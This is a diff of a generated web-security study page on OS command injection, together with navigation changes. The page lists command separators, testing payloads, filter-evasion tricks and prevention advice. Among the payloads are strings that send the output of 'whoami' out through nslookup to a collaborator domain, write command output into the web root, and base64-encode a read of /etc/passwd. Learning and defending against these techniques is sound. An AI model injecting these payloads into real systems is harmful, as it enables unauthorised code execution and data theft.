@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
@@ -469,6 +469,34 @@
   
   
     <li class="md-nav__item">
+      <a href="../broken-authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Broken Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../broken-access-control/" class="md-nav__link">
         
   
@@ -625,6 +653,56 @@
       
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#useful-os-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Useful OS Commands
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-separators" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command Separators
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#testing-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Testing Techniques
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-bypasses-from-detailed-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced Bypasses (from detailed notes)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -845,34 +923,6 @@
   
   
     <li class="md-nav__item">
-      <a href="../authentication/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Authentication
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
       <a href="../business-logic-vulnerabilities/" class="md-nav__link">
         
   
@@ -937,6 +987,62 @@
     
   
     Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file-inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file-upload-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload Attacks
   
 
     
@@ -1339,6 +1445,56 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#useful-os-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Useful OS Commands
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-separators" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command Separators
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#testing-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Testing Techniques
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-bypasses-from-detailed-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced Bypasses (from detailed notes)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1393,12 +1549,163 @@
 
 <h1 id="command-injection">Command Injection</h1>
 <h2 id="overview">Overview</h2>
+<p>Command injection (also called OS command injection) vulnerabilities occur when an application passes unsanitized user input to a system shell. An attacker can inject additional commands that are executed with the privileges of the web application process.</p>
+<p>This is one of the most severe web vulnerabilities because it often leads to full system compromise.</p>
 <h2 id="attack-surface">Attack Surface</h2>
+<ul>
+<li>Features that execute system commands based on user input (ping tools, WHOIS lookups, image processing with tools like ImageMagick, PDF generation, etc.)</li>
+<li>Any functionality using functions like <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>popen()</code> in PHP, or <code>os.system()</code>, <code>subprocess</code> in Python without proper escaping.</li>
+</ul>
 <h2 id="identification">Identification</h2>
+<ul>
+<li>Identify functionality that interacts with the operating system or external commands.</li>
+<li>Test by injecting command separators and simple commands (e.g., <code>&amp; echo test &amp;</code> or <code>; id</code>).</li>
+<li>Use time-based detection for blind injections (<code>ping -c 10 127.0.0.1</code> or equivalent).</li>
+<li>Write output to files that can be retrieved via other means (web root, then request the file).</li>
+<li>Use out-of-band (OAST) techniques with DNS/HTTP callbacks (nslookup to collaborator domain).</li>
+</ul>
 <h2 id="exploitation">Exploitation</h2>
+<h3 id="useful-os-commands">Useful OS Commands</h3>
+<table>
+<thead>
+<tr>
+<th>Purpose</th>
+<th>Linux</th>
+<th>Windows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Current user</td>
+<td>whoami</td>
+<td>whoami</td>
+</tr>
+<tr>
+<td>OS version</td>
+<td>uname -a</td>
+<td>ver</td>
+</tr>
+<tr>
+<td>Network config</td>
+<td>ifconfig</td>
+<td>ipconfig /all</td>
+</tr>
+<tr>
+<td>Network connections</td>
+<td>netstat -an</td>
+<td>netstat -an</td>
+</tr>
+<tr>
+<td>Running processes</td>
+<td>ps -ef</td>
+<td>tasklist</td>
+</tr>
+</tbody>
+</table>
+<h3 id="command-separators">Command Separators</h3>
+<table>
+<thead>
+<tr>
+<th>Separator</th>
+<th>OS</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&amp;</code></td>
+<td>Windows &amp; Unix</td>
+<td>Runs both</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>Windows &amp; Unix</td>
+<td>Runs second only if first succeeds</td>
+</tr>
+<tr>
+<td><code>\|</code></td>
+<td>Windows &amp; Unix</td>
+<td>Pipes output; second shown</td>
+</tr>
+<tr>
+<td><code>\|\|</code></td>
+<td>Windows &amp; Unix</td>
+<td>Runs second only if first fails</td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td>Unix</td>
+<td>Runs both</td>
+</tr>
+<tr>
+<td>Newline</td>
+<td>Unix</td>
+<td><code>0x0a</code> or <code>\n</code></td>
+</tr>
+<tr>
+<td><code>`cmd`</code></td>
+<td>Unix</td>
+<td>Command substitution</td>
+</tr>
+<tr>
+<td><code>$(cmd)</code></td>
+<td>Unix</td>
+<td>Command substitution</td>
+</tr>
+</tbody>
+</table>
+<h3 id="testing-techniques">Testing Techniques</h3>
+<ul>
+<li>Simple injection: <code>&amp; echo aiwefwlguh &amp;</code></li>
+<li>Blind/time-based: <code>&amp; ping -c 10 127.0.0.1 &amp;</code> or <code>||ping+-c+10+127.0.0.1||</code></li>
+<li>Write to file for verification: <code>||whoami+&gt;+/var/www/images/whoami.txt||</code> then retrieve via web request.</li>
+<li>OAST: <code>||nslookup+</code>whoami<code>.collaborator.example.com||</code></li>
+</ul>
+<h3 id="advanced-bypasses-from-detailed-notes">Advanced Bypasses (from detailed notes)</h3>
+<p><strong>Space bypasses (Linux):</strong>
+- <code>%09</code> (tab)
+- <code>${IFS}</code> or <code>$IFS</code>
+- <code>{ls,-la}</code> (brace expansion)</p>
+<p><strong>Character and case manipulation:</strong>
+- <code>c"a"t</code> or <code>$@</code>
+- Case: <code>$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")</code>
+- Reversal: <code>echo 'whoami' | rev</code>
+- Base64: <code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dk...)</code></p>
+<p>See PayloadsAllTheThings for extensive bypass collections.</p>
 <h2 id="impact">Impact</h2>
+<ul>
+<li>Full remote code execution on the server</li>
+<li>Data exfiltration, modification, or deletion</li>
+<li>Lateral movement within the network</li>
+<li>Installation of persistent backdoors or malware</li>
+<li>Complete takeover of the underlying host</li>
+</ul>
 <h2 id="prevention">Prevention</h2>
+<ul>
+<li>Avoid calling OS commands from application code whenever possible.</li>
+<li>Use safe APIs and libraries instead of shells.</li>
+<li>If shell commands are required, use parameterized APIs or proper escaping functions provided by the language.</li>
+<li>Strictly validate and sanitize all input (whitelisting is preferred).</li>
+<li>Run the application with the lowest possible privileges.</li>
+<li>Implement WAF rules and monitoring for suspicious command patterns.</li>
+</ul>
 <h2 id="tools-payloads">Tools &amp; Payloads</h2>
+<ul>
+<li>Burp Repeater and Intruder for testing separators and payloads</li>
+<li>Netcat or Burp Collaborator for OAST verification</li>
+<li>ffuf or custom scripts for blind exploitation</li>
+</ul>
+<p><strong>Example OAST payload (adapt domain):</strong>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="o">||</span>nslookup<span class="w"> </span><span class="sb">`</span>whoami<span class="sb">`</span>.your-collaborator-id.oastify.com<span class="o">||</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p><strong>Writing output for blind verification:</strong>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="o">||</span>whoami<span class="w"> </span>&gt;<span class="w"> </span>/var/www/html/whoami.txt<span class="o">||</span>
+</span><span id="__span-1-2"><span class="c1"># Then visit http://target/whoami.txt</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>For more bypasses and payloads, refer to:
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</p>
+<p>See the <a href="../file-upload-attacks/">File Upload Attacks</a> page for related techniques when shells are delivered via uploads.</p>
 
 
 
